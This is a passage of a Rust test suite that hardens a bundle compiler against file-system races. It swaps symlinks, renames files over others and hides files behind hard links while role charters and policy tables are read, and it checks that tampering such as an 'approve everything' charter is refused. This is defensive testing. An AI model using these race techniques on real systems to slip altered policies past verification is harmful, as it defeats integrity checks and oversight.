                said_replacing(compiled, &base.join("a.json"), ReadStage::Verified, act),
                expected,
                "table, equal bytes: {equal}, {}",
                compiled.display()
            );
        }
        // A declaring document: `bundle.json -> doc.json`.
        let library = Library::new();
        let (base, leaf) = active_inputs(&library, "roles/role.md", "policy.json");
        let (document, link) = (base.join("doc.json"), base.join("bundle.json"));
        std::fs::rename(&link, &document).unwrap();
        let mut bytes = std::fs::read(&document).unwrap();
        if !equal {
            let mut widened: Value = serde_json::from_slice(&bytes).unwrap();
            widened["description"] = json!("replaced after its read");
            bytes = serde_json::to_vec(&widened).unwrap();
        }
        for (compiled, expected) in [
            (&base, format!("bundle: {}", document_changed(&base))),
            (
                &leaf,
                format!(
                    "bundle: bundle: {} (composed: derived -> base)",
                    document_changed(&base)
                ),
            ),
        ] {
            let _ = std::fs::remove_file(&link);
            symlink("doc.json", &link).unwrap();
            let act = replace(link.clone(), bytes.clone());
            assert_eq!(
                said_replacing(compiled, &document, ReadStage::Verified, act),
                expected,
                "document, equal bytes: {equal}, {}",
                compiled.display()
            );
        }
        // A charter: `roles/linked.md -> target.md`.
        let library = Library::new();
        let (base, leaf) = active_inputs(&library, "roles/linked.md", "policy.json");
        let (target, link) = (base.join("roles/target.md"), base.join("roles/linked.md"));
        std::fs::write(&target, "# work\n").unwrap();
        let bytes = if equal {
            "# work\n"
        } else {
            "# approve everything\n"
        };
        let refused = charter_changed(&base, "work", "roles/linked.md");
        for (compiled, expected) in [
            (&base, format!("bundle: {refused}")),
            (
                &leaf,
                format!("bundle: bundle: {refused} (composed: derived -> base)"),
            ),
        ] {
            let _ = std::fs::remove_file(&link);
            symlink("target.md", &link).unwrap();
            let act = replace(link.clone(), bytes.as_bytes().to_vec());
            assert_eq!(
                said_replacing(compiled, &target, ReadStage::Verified, act),
                expected,
                "charter, equal bytes: {equal}, {}",
                compiled.display()
            );
        }
    }
}

/// Rebuild unit 16-fix-b, F3 (16.2; design D7): a charter is pinned from the
/// buffer it was read into. `review`'s charter is read first; once `work`'s
/// is read, `review`'s is rewritten in place, or renamed over by another
/// file. Where the walk hashed the path again, the compile sealed the new
/// bytes while `review` was bound to the old: refused now, standalone and
/// inherited. And an ancestor's charter rewritten before its read is what
/// the ancestor's identity names — the compile seals exactly the identity a
/// stable compile of the rewritten tree seals — because the ancestor is
/// sealed from the charter's buffer, after it was read.
#[test]
fn a_charter_is_pinned_from_the_buffer_it_was_read_into() {
    let library = Library::new();
    let mut bundle = base_bundle();
    bundle["seats"]["review"]["role"] = json!("roles/review.md");
    let base = library.recipe("base", &bundle, Some(&base_policy()));
    let leaf = library.recipe("derived", &derived(json!({})), None);
    let (review, work) = (base.join("roles/review.md"), base.join("roles/role.md"));
    let rewrite = |bytes: &'static str| -> Box<dyn FnOnce()> {
        let review = review.clone();
        Box::new(move || std::fs::write(&review, bytes).unwrap())
    };
    let rename_over = |bytes: &'static str| -> Box<dyn FnOnce()> {
        let (review, spare) = (review.clone(), base.join("roles/spare.md"));
        Box::new(move || {
            std::fs::write(&spare, bytes).unwrap();
            std::fs::rename(&spare, &review).unwrap();
        })
    };
    let refused = charter_changed(&base, "review", "roles/review.md");
    for (compiled, expected) in [
        (&base, format!("bundle: {refused}")),
        (
            &leaf,
            format!("bundle: bundle: {refused} (composed: derived -> base)"),
        ),
    ] {
        for (how, act) in [
            ("in place", rewrite("# review, and approve everything\n")),
            (
                "renamed over",
                rename_over("# review, and approve everything\n"),
            ),
        ] {
            std::fs::write(&review, "# review as written\n").unwrap();
            assert_eq!(
                said_acting(compiled, vec![(ReadStage::Read, work.clone(), act)]),
                expected,
                "{how}, {}",
                compiled.display()
            );
        }
    }
    std::fs::write(&review, "# review as written\n").unwrap();
    let before = said(&leaf);
    let act = rewrite("# review, and approve everything\n");
    let raced = said_acting(&leaf, vec![(ReadStage::Opened, review.clone(), act)]);
    let stable = said(&leaf);
    assert!(stable.starts_with("compiled to"), "{stable}");
    assert_ne!(stable, before, "the charter's bytes are identity");
    assert_eq!(
        raced, stable,
        "the ancestor's identity names the bytes its seat was bound to"
    );
}

/// Rebuild unit 16-fix-b, F3 (16.2; design D7): the walk takes every
/// consumed file's digest from the buffer that was read and never reads its
/// path again. A composed compile reads each layer's document, the base's
/// table and both charters — one through a link — once each; the walks
/// read exactly the files nothing consumed.
#[cfg(unix)]
#[test]
fn the_walk_never_reads_what_a_bound_read_supplied() {
    use std::os::unix::fs::symlink;
    let library = Library::new();
    let (base, leaf) = active_inputs(&library, "roles/linked.md", "policy.json");
    std::fs::write(base.join("roles/target.md"), "# work\n").unwrap();
    symlink("target.md", base.join("roles/linked.md")).unwrap();
    std::fs::write(base.join("notes.md"), "# consumed by nothing\n").unwrap();
    let walked = std::rc::Rc::new(std::cell::RefCell::new(Vec::new()));
    let record = walked.clone();
    READ_HOOK.with(|hook| {
        *hook.borrow_mut() = Some(Box::new(move |at, path| {
            if at == ReadStage::Walked {
                record.borrow_mut().push(path.to_path_buf());
            }
        }));
    });
    let compiled = said(&leaf);
    READ_HOOK.with(|hook| *hook.borrow_mut() = None);
    assert!(compiled.starts_with("compiled to"), "{compiled}");
    let mut walked = walked.take();
    walked.sort();
    assert_eq!(
        walked,
        vec![base.join("notes.md"), leaf.join("roles/role.md")]
    );
}

/// Rebuild unit 16-fix-b, F2 (16.1; design D7): an input is resolved from
/// its layer's directory handle a name at a time, each name looked up
/// inside the handle before it — never a path canonicalized and then
/// opened. Once `tables` is held, it is moved aside and another directory,
/// holding another valid ruling under the same name, takes its place; once
/// the table inside the HELD directory is open, the original is moved back.
/// The read is the held directory's table, which is where the verification
/// finds it again, so the compile seals exactly the identity an undisturbed
/// compile seals. Left swapped, it is refused as replaced: the buffer is the
/// originally bound file's, or there is none.
#[test]
fn a_resolution_descends_the_directory_handles_it_holds() {
    for restored in [true, false] {
        let library = Library::new();
        let (base, _) = active_inputs(&library, "roles/role.md", "tables/policy.json");
        let (tables, aside) = (base.join("tables"), base.join("aside"));
        std::fs::create_dir_all(&tables).unwrap();
        let policy = tables.join("policy.json");
        std::fs::write(&policy, serde_json::to_vec(&base_policy()).unwrap()).unwrap();
        let stable = said(&base);
        assert!(stable.starts_with("compiled to"), "{stable}");
        let swap: Box<dyn FnOnce()> = {
            let (tables, aside) = (tables.clone(), aside.clone());
            Box::new(move || {
                std::fs::rename(&tables, &aside).unwrap();
                std::fs::create_dir(&tables).unwrap();
                let other = serde_json::to_vec(&other_policy()).unwrap();
                std::fs::write(tables.join("policy.json"), other).unwrap();
            })
        };
        let mut acts = vec![(ReadStage::Entered, tables.clone(), swap)];
        if restored {
            let elsewhere = library.path().join("elsewhere");
            let (tables, aside) = (tables.clone(), aside.clone());
            let restore: Box<dyn FnOnce()> = Box::new(move || {
                std::fs::rename(&tables, &elsewhere).unwrap();
                std::fs::rename(&aside, &tables).unwrap();
            });
            acts.push((ReadStage::Entered, policy.clone(), restore));
        }
        let expected = match restored {
            true => stable,
            false => format!(
                "bundle: {}",
                policy_escape(&base, "tables/policy.json", REPLACED)
            ),
        };
        assert_eq!(said_acting(&base, acts), expected, "restored: {restored}");
    }
}

/// Rebuild unit 16-fix-b (16.1; design D7): the resolution follows a link's
/// text itself. An absolute text standing inside the layer restarts at the
/// layer's directory and is followed, the target's bytes pinned under both
/// entries; a `./` step is no step, so the same file read through it is
/// the entry its directory lists; and a loop of links names no file and is
/// refused.
#[cfg(unix)]
#[test]
fn a_link_loop_names_no_file_and_an_absolute_contained_link_is_followed() {
    use std::os::unix::fs::symlink;
    let library = Library::new();
    let (base, _) = active_inputs(&library, "roles/absolute.md", "policy.json");
    std::fs::write(base.join("roles/target.md"), "# work\n").unwrap();
    symlink(base.join("roles/target.md"), base.join("roles/absolute.md")).unwrap();
    let bundle = Bundle::compile(&base).unwrap();
    let files = &bundle.manifest["files"];
    let digest = json!(sha256_bytes(b"# work\n"));
    assert_eq!(
        (files.get("roles/absolute.md"), files.get("roles/target.md")),
        (Some(&digest), Some(&digest))
    );
    let mut bundle = base_bundle();
    bundle["seats"]["work"]["role"] = json!("./roles/target.md");
    let dir = library.recipe("base", &bundle, Some(&base_policy()));
    let compiled = said(&dir);
    assert!(compiled.starts_with("compiled to"), "{compiled}");
    let library = Library::new();
    let (base, _) = active_inputs(&library, "roles/a.md", "policy.json");
    symlink("b.md", base.join("roles/a.md")).unwrap();
    symlink("a.md", base.join("roles/b.md")).unwrap();
    assert_eq!(
        said(&base),
        format!(
            "bundle: {}",
            role_escape(
                &base,
                "roles/a.md",
                "which resolves through more than 40 links, so it names no file"
            )
        )
    );
}

// ------------------------- unit 16-fix-c: the key belongs to the handle

/// A hard link at `link` to `file`, then `file` moved to `aside`: the
/// directory lists the file only as `link`.
fn hide_behind(file: &Path, link: &Path, aside: &Path) {
    std::fs::hard_link(file, link).unwrap();
    std::fs::rename(file, aside).unwrap();
}

/// The walk's refusal of `other`, a second name for `consumed`, the file a
/// bound read consumed.
fn another_name(other: &str, consumed: &str) -> String {
    format!(
        "bundle file '{other}' is another name for '{consumed}', the file a bound read consumed: \
         a layer's identity names a consumed file by the entry it was read by, and a second name \
         for it inside the layer is refused rather than walked as a file nothing consumed \
         (decision 0065 slice one, design D7)"
    )
}

/// What compiling `base` said while, at EVERY observation of its table
/// `policy.json` that finds the held file A there, `h.json` was made a hard
/// link to A once its handle was open and `policy.json` was moved out of
/// the layer; between the read's two observations A was put back. With
/// `supply`, once the read is verified another valid ruling B is written at
/// `policy.json`, and once the walk has passed it, A is put back, to be
/// hidden again by the walk's own verification.
///
/// With `failing`, `h2.json` is made a second hard link to A with `h.json`
/// at each observation, and removed as soon as anything looks it up, so its
/// lookup fails; once the walk has passed its table, A is put back as with
/// `supply`, without B.
#[cfg(unix)]
#[expect(
    clippy::excessive_nesting,
    reason = "baseline 2026-09-29, decision 0065 slice one merged with main; split after #319"
)]
fn hidden_at_every_observation(
    library: &Library,
    base: &Path,
    supply: bool,
    failing: bool,
) -> String {
    use std::os::unix::fs::MetadataExt;
    let later = base.join("zz.md");
    std::fs::write(&later, "# walked after the table\n").unwrap();
    let (policy, link) = (base.join("policy.json"), base.join("h.json"));
    let second = base.join("h2.json");
    let (aside, spare) = (library.path().join("aside"), library.path().join("spare"));
    let held = std::fs::metadata(&policy).unwrap().ino();
    let other = serde_json::to_vec(&other_policy()).unwrap();
    // The read's own stages are reached at the target it bound, which on
    // `95d4ff19` was the other name.
    let read = [policy.clone(), link.clone()];
    READ_HOOK.with(|hook| {
        *hook.borrow_mut() = Some(Box::new(move |at, path| {
            let holds = std::fs::symlink_metadata(&policy).is_ok_and(|meta| meta.ino() == held);
            match at {
                ReadStage::Entered if path == policy && holds => {
                    let names = [&link, &second];
                    for name in &names[..1 + usize::from(failing)] {
                        if !name.exists() {
                            std::fs::hard_link(&policy, name).unwrap();
                        }
                    }
                    std::fs::rename(&policy, &aside).unwrap();
                }
                ReadStage::Entered if failing && path == second => {
                    std::fs::remove_file(&second).unwrap();
                }
                ReadStage::Read if read.iter().any(|name| name == path) => {
                    std::fs::rename(&aside, &policy).unwrap();
                }
                ReadStage::Verified if supply && read.iter().any(|name| name == path) => {
                    std::fs::write(&policy, &other).unwrap();
                }
                ReadStage::Walked if (supply || failing) && path == later => {
                    if supply {
                        std::fs::rename(&policy, &spare).unwrap();
                    }
                    std::fs::rename(&aside, &policy).unwrap();
                }
                _ => {}
            }
        }));
    });
    let said = said(base);
    READ_HOOK.with(|hook| *hook.borrow_mut() = None);
    said
}

/// Rebuild unit 16-fix-d, F1 (16.1, 16.2; design D7): the chief's repeated
/// interleaving. `policy.json` is hidden behind `h.json` at each of the
/// read's observations and put back between them, then ruling B is supplied
/// at `policy.json` for the walk alone. On `95d4ff19` each observation bound
/// the absent name to `h.json`, the one other entry holding A, so the two
/// agreed; the walk hashed B under `policy.json` beside A's `h.json`, and
/// the walk's verification, hiding A again, passed: the compile parsed A
/// while its map named B. Now the name is bound exactly as it was looked up
/// and no other entry is ever substituted, so the walk meets `h.json` as a
/// second name for the consumed file and refuses it.
#[cfg(unix)]
#[test]
fn a_name_hidden_at_every_observation_binds_no_other_entry() {
    let library = Library::new();
    let (base, _) = active_inputs(&library, "roles/role.md", "policy.json");
    assert_eq!(
        hidden_at_every_observation(&library, &base, true, false),
        format!("bundle: {}", another_name("h.json", "policy.json"))
    );
}

/// Rebuild unit 16-fix-d (16.1, 16.2; design D7): a name gone at the walk
/// is not found elsewhere. `policy.json` is hidden at each of the read's
/// observations and put back between them, and is gone when the walk runs,
/// while `h.json` holds the file that was read. On `95d4ff19` the
/// observations had bound `h.json` in its place; now the walk lists no
/// entry of the name the file was read by, and refuses for exactly that.
/// (Each lookup here succeeds; a lookup that FAILS is
/// `a_lookup_that_fails_is_refused_where_it_fails`.)
#[cfg(unix)]
#[test]
fn a_name_that_no_longer_resolves_is_refused_not_found_elsewhere() {
    let library = Library::new();
    let (base, _) = active_inputs(&library, "roles/role.md", "policy.json");
    assert_eq!(
        hidden_at_every_observation(&library, &base, false, false),
        format!(
            "bundle: {}",
            unwalked(&table_by(&base, "policy.json"), "policy.json")
        )
    );
}

/// Rebuild unit 16-fix-d, return F2 (16.1, 16.2; design D7): the case
/// `95d4ff19` accepted, one entry holding the read file whose lookup
/// succeeds beside another whose lookup FAILS. At each observation
/// `policy.json` is hidden behind `h.json` and `h2.json`, and put back
/// between them and once the walk has passed it. `95d4ff19` searched the
/// directory for the absent name and discarded the failed lookup of
/// `h2.json`, so `h.json` stood alone, was bound at every observation, and
/// the compile sealed it. Now nothing is looked up in the name's place: the
/// read binds `policy.json` exactly, and the walk, which lists no entry of
/// it, refuses.
#[cfg(unix)]
#[test]
fn a_failing_lookup_beside_another_name_binds_neither() {
    let library = Library::new();
    let (base, _) = active_inputs(&library, "roles/role.md", "policy.json");
    assert_eq!(
        hidden_at_every_observation(&library, &base, false, true),
        format!(
            "bundle: {}",
            unwalked(&table_by(&base, "policy.json"), "policy.json")
        )
    );
}

/// Rebuild unit 16-fix-d, return F1 (16.1, 16.2; design D7): a hard link to
/// the consumed table under a top-level name the walk skips is a second name
/// for it inside the layer all the same, refused standalone and inherited.
/// A copy at the same name, the same bytes in another file, is no name for
/// it and moves neither identity: the skipped trees stay unpinned.
#[cfg(unix)]
#[test]
fn a_skipped_tree_holds_no_second_name_for_a_consumed_file() {
    let (mut observed, mut expected) = (Vec::new(), Vec::new());
    for other in [
        "capabilities/second.json",
        "dialects/second.json",
        "realms.json",
    ] {
        let library = Library::new();
        let (base, leaf) = active_inputs(&library, "roles/role.md", "policy.json");
        std::fs::create_dir_all(base.join("dialects")).unwrap();
        let before = (said(&base), said(&leaf));
        assert!(before.0.starts_with("compiled to"), "{other}: {}", before.0);
        std::fs::copy(base.join("policy.json"), base.join(other)).unwrap();
        assert_eq!((said(&base), said(&leaf)), before, "{other}: a copy");
        std::fs::remove_file(base.join(other)).unwrap();
        std::fs::hard_link(base.join("policy.json"), base.join(other)).unwrap();
        let refused = another_name(other, "policy.json");
        observed.push((other, said(&base), said(&leaf)));
        expected.push((
            other,
            format!("bundle: {refused}"),
            format!("bundle: bundle: {refused} (composed: derived -> base)"),
        ));
    }
    assert_eq!(observed, expected);
}

// ------------------------- unit 16-fix-e: the walk names what it cannot see

/// The walk's refusal of `consumer`'s entry `key`, which it could not
/// observe for `cause`.
fn unobserved_entry(consumer: &str, key: &str, cause: &str) -> String {
    format!(
        "{consumer}, whose entry '{key}' the walk that pins the layer cannot observe ({cause}): it \
         was removed, replaced or made unobservable after the read. A consumed input the walk \
         cannot observe is refused rather than pinned unobserved (decision 0065 slice one, \
         design D7)"
    )
}

/// The walk's refusal of the layer's directory `key`, which it could not
/// list for `cause`.
fn unlisted_directory(key: &str, cause: &str) -> String {
    format!(
        "bundle directory './{key}' cannot be listed ({cause}): the walk that pins a layer lists \
         every directory it enters, a skipped tree's included where it holds each consumed file \
         to one name, so a directory it cannot list is refused rather than passed over (decision \
         0065 slice one, design D7)"
    )
}

/// Rebuild unit 16-fix-e, F1 (16.1; capability-manifest-and-prompts: a
/// missing consumed input refuses with a bounded source/site/kind/path
/// cause): once the walk has listed the layer, a consumed entry it can no
/// longer observe names who read it, standalone and inherited. The table
/// `policy.json` is removed as the walk reaches `aa.bin`, listed before it;
/// and `roles/` is moved aside as the walk reaches `zz.md`, a hard link to
/// the charter listed after it, whose target entry is then asked. On
/// `af773294` the first said only "bundle io: No such file or directory".
#[cfg(unix)]
#[test]
fn a_consumed_entry_the_walk_cannot_observe_names_who_read_it() {
    let (mut observed, mut expected) = (Vec::new(), Vec::new());
    for inherited in [false, true] {
        let library = Library::new();
        let (base, leaf) = active_inputs(&library, "roles/role.md", "policy.json");
        let compiled = if inherited { &leaf } else { &base };
        let (early, late) = (base.join("aa.bin"), base.join("zz.md"));
        std::fs::write(&early, "walked before the table\n").unwrap();
        let policy = base.join("policy.json");
        let remove: Box<dyn FnOnce()> = Box::new(move || std::fs::remove_file(&policy).unwrap());
        let table = said_acting(compiled, vec![(ReadStage::Walked, early.clone(), remove)]);
        let ruling = serde_json::to_vec(&base_policy()).unwrap();
        std::fs::write(base.join("policy.json"), ruling).unwrap();
        std::fs::remove_file(&early).unwrap();
        std::fs::hard_link(base.join("roles/role.md"), &late).unwrap();
        let (roles, aside) = (base.join("roles"), library.path().join("aside"));
        let away: Box<dyn FnOnce()> = Box::new(move || std::fs::rename(&roles, &aside).unwrap());
        let role = said_acting(compiled, vec![(ReadStage::Walked, late, away)]);
        observed.push((inherited, table, role));
        let refused = |consumer: &str, key: &str| {
            let refusal = unobserved_entry(consumer, key, "entity not found");
            match inherited {
                false => format!("bundle: {refusal}"),
                true => format!("bundle: bundle: {refusal} (composed: derived -> base)"),
            }
        };
        expected.push((
            inherited,
            refused(&table_by(&base, "policy.json"), "policy.json"),
            // `review`, read first, also names the charter `work` names.
            refused(&role_by(&base, "review", "roles/role.md"), "roles/role.md"),
        ));
    }
    assert_eq!(observed, expected);
}

/// Rebuild unit 16-fix-e, F3 (16.1; design D7): the search of a skipped tree
/// for a second name follows no link. `dialects/out` links to a directory
/// outside the layer holding one it cannot list, and `dialects/up` links
/// back to the layer: neither is descended, so both identities stand as
/// they stood without them (on `af773294`, following `out` refused with a
/// bare "bundle io: Permission denied"). A directory INSIDE the skipped tree
/// that the walk cannot list is refused naming it, standalone and
/// inherited.
#[cfg(unix)]
#[test]
fn a_skipped_tree_is_searched_without_following_a_link() {
    use std::os::unix::fs::{symlink, PermissionsExt};
    let mode = |path: &Path, bits| {
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(bits)).unwrap()
    };
    let library = Library::new();
    let (base, leaf) = active_inputs(&library, "roles/role.md", "policy.json");
    std::fs::create_dir_all(base.join("dialects")).unwrap();
    let before = (said(&base), said(&leaf));
    assert!(before.0.starts_with("compiled to"), "{}", before.0);
    let (outside, private) = (
        library.path().join("outside"),
        base.join("dialects/private"),
    );
    std::fs::create_dir_all(outside.join("locked")).unwrap();
    symlink(&outside, base.join("dialects/out")).unwrap();
    symlink("..", base.join("dialects/up")).unwrap();
    mode(&outside.join("locked"), 0o000);
    let linked = (said(&base), said(&leaf));
    std::fs::create_dir(&private).unwrap();
    mode(&private, 0o000);
    let locked = (said(&base), said(&leaf));
    mode(&private, 0o755);
    mode(&outside.join("locked"), 0o755);
    let refused = unlisted_directory("dialects/private", "permission denied");
    assert_eq!(
        (linked, locked),
        (
            before,
            (
                format!("bundle: {refused}"),
                format!("bundle: bundle: {refused} (composed: derived -> base)")
            )
        )
    );
}

/// Rebuild unit 16-fix-e, F2 (16.2; decision 0046 ruling 4): a re-walk of a
/// leaf's own directory, which consumed nothing, passes over the top-level
/// names the walk skips without entering them, as `layer_drift` reaches it
/// for a script at the layer's root. Operator configuration written there
/// after the compile — the realm map, a dialect, a capability definition,
/// and a dialect directory it could not even list — names no drift; a file
/// the layer pins does.
#[cfg(unix)]
#[test]
fn a_root_rewalk_passes_over_what_the_walk_skips() {
    use std::os::unix::fs::PermissionsExt;
    let library = Library::new();
    let (_, leaf) = active_inputs(&library, "roles/role.md", "policy.json");
    let bundle = Bundle::compile(&leaf).unwrap();
    assert_eq!(layer_drift(&bundle, &leaf), None);
    for dir in ["dialects/private", "capabilities"] {
        std::fs::create_dir_all(leaf.join(dir)).unwrap();
    }
    for file in [
        "realms.json",
        "dialects/claude.json",
        "capabilities/read.json",
    ] {
        std::fs::write(leaf.join(file), "{}\n").unwrap();
    }
    let private = leaf.join("dialects/private");
    std::fs::set_permissions(&private, std::fs::Permissions::from_mode(0o000)).unwrap();
    let skipped = layer_drift(&bundle, &leaf);
    std::fs::write(leaf.join("notes.md"), "# pinned\n").unwrap();
    let added = layer_drift(&bundle, &leaf);
    std::fs::set_permissions(&private, std::fs::Permissions::from_mode(0o755)).unwrap();
    assert_eq!(
        (skipped, added),
        (
            None,
            Some(("derived".to_string(), "added: notes.md".to_string()))
        )
    );
}

// ---------------- unit 16-fix-e, return: collection names who read it

/// A mode-000 directory put at `path`, whatever stood there moved to
/// `aside`.
#[cfg(unix)]
fn locked_in_place_of(path: &Path, aside: &Path) {
    use std::os::unix::fs::PermissionsExt;
    std::fs::rename(path, aside).unwrap();
    std::fs::create_dir(path).unwrap();
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o000)).unwrap();
}

/// Rebuild unit 16-fix-e, return F1 (16.1; capability-manifest-and-prompts:
/// a missing or unreadable consumed input refuses with a bounded
/// source/site/kind/path cause): as the walk is about to list the layer, the
/// table `policy.json`, already read, is replaced by a directory it cannot
/// list, and in a second compile `roles/`, which holds the charter, is. The
/// consumed entry is walked as the one entry it is, never descended, so the
/// table's own check names it; a directory holding a consumed entry that the
/// walk cannot list names who read that entry. Standalone and inherited. On
/// `e132c3a5` both said only "bundle directory ... cannot be listed".
#[cfg(unix)]
#[test]
fn a_consumed_entry_replaced_before_the_walk_lists_it_names_who_read_it() {
    use std::os::unix::fs::PermissionsExt;
    let (mut observed, mut expected) = (Vec::new(), Vec::new());
    for inherited in [false, true] {
        let library = Library::new();
        let (base, leaf) = active_inputs(&library, "roles/role.md", "policy.json");
        let compiled = if inherited { &leaf } else { &base };
        let said_locked = |name: &str| {
            let (path, aside) = (base.join(name), library.path().join("aside"));
            let (locked, moved) = (path.clone(), aside.clone());
            let act: Box<dyn FnOnce()> = Box::new(move || locked_in_place_of(&locked, &moved));
            let said = said_acting(compiled, vec![(ReadStage::Listing, base.clone(), act)]);
            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
            std::fs::remove_dir(&path).unwrap();
            std::fs::rename(&aside, &path).unwrap();
            said
        };
        let (table, role) = (said_locked("policy.json"), said_locked("roles"));
        observed.push((inherited, table, role));
        let refused = |refusal: String| match inherited {
            false => format!("bundle: {refusal}"),
            true => format!("bundle: bundle: {refusal} (composed: derived -> base)"),
        };
        expected.push((
            inherited,
            refused(table_changed(&base, "policy.json")),
            // `review`, read first, also names the charter `work` names.
            refused(format!(
                "{}, whose entry 'roles/role.md' stands in {}",
                role_by(&base, "review", "roles/role.md"),
                unlisted_directory("roles", "permission denied")
            )),
        ));
    }
    assert_eq!(observed, expected);
}

/// The walk's refusal of the skipped directory `key`, replaced `moment` it
/// was listed.
fn replaced_directory(key: &str, moment: &str) -> String {
    format!(
        "bundle directory './{key}' was replaced {moment} the walk listed it: a tree the walk \
         skips is searched only to hold each consumed file to one name, entered as the directory \
         its parent listed there and never through a link, so a directory replaced there is \
         refused rather than followed (decision 0065 slice one, design D7)"
    )
}

/// What Linux's inotify saw done to the directory `watched` while `act` ran:
/// the mask of each event that opened or read it (`IN_OPEN`, `IN_ACCESS`),
/// in order, beside what `act` said. A listing opens and reads the directory
/// it lists, so an empty list is a directory nothing listed.
#[cfg(target_os = "linux")]
fn opened_while(watched: &Path, act: impl FnOnce() -> String) -> (String, Vec<u32>) {
    use rustix::fs::inotify::{self, CreateFlags, WatchFlags};
    use std::io::Read;
    let fd = inotify::init(CreateFlags::NONBLOCK | CreateFlags::CLOEXEC).expect("inotify");
    inotify::add_watch(&fd, watched, WatchFlags::OPEN | WatchFlags::ACCESS).expect("inotify");
    let mut events = std::fs::File::from(fd);
    let said = act();
    let mut buffer = vec![0u8; 64 * 1024];
    let length = match events.read(&mut buffer) {
        Ok(length) => length,
        Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => 0,
        Err(error) => panic!("inotify: {error}"),
    };
    // Each event: `wd`, `mask`, `cookie`, `len`, then `len` bytes of name.
    let (mut masks, mut at) = (Vec::new(), 0);
    while at < length {
        let word = |offset: usize| {
            u32::from_ne_bytes(buffer[at + offset..at + offset + 4].try_into().unwrap())
        };
        masks.push(word(4));
        at += 16 + word(12) as usize;
    }
    (said, masks)
}

/// macOS has no inotify: there only what `act` said is observed.
#[cfg(all(unix, not(target_os = "linux")))]
fn opened_while(_: &Path, act: impl FnOnce() -> String) -> (String, Vec<u32>) {
    (act(), Vec::new())
}

/// Rebuild unit 16-fix-e, return F3 and second return F2 (16.1; design D7):
/// a directory in a skipped tree is entered through its parent's handle as
/// the directory its parent listed, never through a link put in its place,
/// and listed through that handle. `dialects`, an ordinary directory, is
/// replaced by a link to a directory outside the layer holding one it cannot
/// list, or by a new directory: as the walk is about to open it, and once it
/// is open and checked and about to be listed. Each is refused naming
/// `dialects`, standalone and inherited; inotify sees nothing open or read
/// the outside directory; and what is left standing there compiles with the
/// identity the ordinary directory had. On `e132c3a5` each replacement was
/// listed and descended, and refused the outside tree's './dialects/locked';
/// on `0fcec52f` the link put in place once the directory was checked was
/// listed, opening and reading the outside directory, before it was refused.
#[cfg(unix)]
#[test]
fn a_skipped_directory_replaced_by_a_link_is_not_followed() {
    use std::os::unix::fs::{symlink, PermissionsExt};
    let (mut observed, mut expected) = (Vec::new(), Vec::new());
    for inherited in [false, true] {
        for (stage, link, moment) in [
            (ReadStage::Listing, true, "before"),
            (ReadStage::Listing, false, "before"),
            (ReadStage::DirectoryChecked, true, "while"),
        ] {
            let library = Library::new();
            let (base, leaf) = active_inputs(&library, "roles/role.md", "policy.json");
            let compiled = if inherited { &leaf } else { &base };
            let dialects = base.join("dialects");
            std::fs::create_dir_all(dialects.join("inner")).unwrap();
            let before = said(compiled);
            assert!(before.starts_with("compiled to"), "{before}");
            let (outside, aside) = (library.path().join("outside"), library.path().join("aside"));
            let locked = outside.join("locked");
            std::fs::create_dir_all(&locked).unwrap();
            std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o000)).unwrap();
            let (replaced, target) = (dialects.clone(), outside.clone());
            let swap: Box<dyn FnOnce()> = Box::new(move || {
                std::fs::rename(&replaced, &aside).unwrap();
                match link {
                    true => symlink(&target, &replaced).unwrap(),
                    false => std::fs::create_dir(&replaced).unwrap(),
                }
            });
            let (swapped, seen) = opened_while(&outside, || {
                said_acting(compiled, vec![(stage, dialects, swap)])
            });
            let standing = said(compiled);
            std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o755)).unwrap();
            observed.push((inherited, stage, link, swapped, seen, standing));
            let refusal = replaced_directory("dialects", moment);
            expected.push((
                inherited,
                stage,
                link,
                match inherited {
                    false => format!("bundle: {refusal}"),
                    true => format!("bundle: bundle: {refusal} (composed: derived -> base)"),
                },
                Vec::<u32>::new(),
                before,
            ));
        }
    }
    assert_eq!(observed, expected);
}

/// The walk's refusal of the entry `key`, in a skipped tree, which it could
/// not observe for `cause`.
fn unobservable_entry(key: &str, cause: &str) -> String {
    format!(
        "bundle entry './{key}', in a tree the walk skips, cannot be observed ({cause}): the walk \
         asks each entry there what it is, without following a link, to hold each consumed file \
         to one name, so an entry it cannot observe is refused rather than passed over (decision \
         0065 slice one, design D7)"
    )
}

/// Rebuild unit 16-fix-e, second return F1 and F3 (16.1; design D7): an
/// entry in a skipped tree that the walk has listed but can no longer ask
/// what it is is refused naming that entry and the failed observation, never
/// as a directory that cannot be listed. `realms.json`, at the layer's top,
/// and `dialects/gone.json`, below it, are each removed at the new `Skipped`
/// seam; each compile is refused naming it, standalone and inherited, after
/// a control compile with the entry standing. On `0fcec52f` plus the seam
/// each said "bundle directory './' or './dialects' cannot be listed (entity
/// not found)".
#[cfg(unix)]
#[test]
fn a_skipped_entry_the_walk_cannot_observe_is_refused_naming_it() {
    let (mut observed, mut expected) = (Vec::new(), Vec::new());
    for inherited in [false, true] {
        for key in ["realms.json", "dialects/gone.json"] {
            let library = Library::new();
            let (base, leaf) = active_inputs(&library, "roles/role.md", "policy.json");
            let compiled = if inherited { &leaf } else { &base };
            let gone = base.join(key);
            std::fs::create_dir_all(gone.parent().unwrap()).unwrap();
            std::fs::write(&gone, "{}\n").unwrap();
            let control = said(compiled);
            let removed = gone.clone();
            let remove: Box<dyn FnOnce()> =
                Box::new(move || std::fs::remove_file(&removed).unwrap());
            let refused = said_acting(compiled, vec![(ReadStage::Skipped, gone, remove)]);
            observed.push((inherited, key, control.starts_with("compiled to"), refused));
            let refusal = unobservable_entry(key, "entity not found");
            expected.push((
                inherited,
                key,
                true,
                match inherited {
                    false => format!("bundle: {refusal}"),
                    true => format!("bundle: bundle: {refusal} (composed: derived -> base)"),
                },
            ));
        }
    }
    assert_eq!(observed, expected);
}

/// Rebuild unit 16-fix-d, F2 (16.1, 16.2; design D7): two consumed names
/// for one file are refused. `review`'s charter `roles/review.md` is a hard
/// link to `work`'s `roles/role.md`; each is a key a bound read consumed,
/// and the walk refuses the second, standalone and inherited — both said
/// in one comparison, so each is observed whatever the other says.
#[cfg(unix)]
#[test]
fn two_consumed_names_for_one_file_are_refused() {
    let library = Library::new();
    let mut bundle = base_bundle();
    bundle["seats"]["review"]["role"] = json!("roles/review.md");
    let base = library.recipe("base", &bundle, Some(&base_policy()));
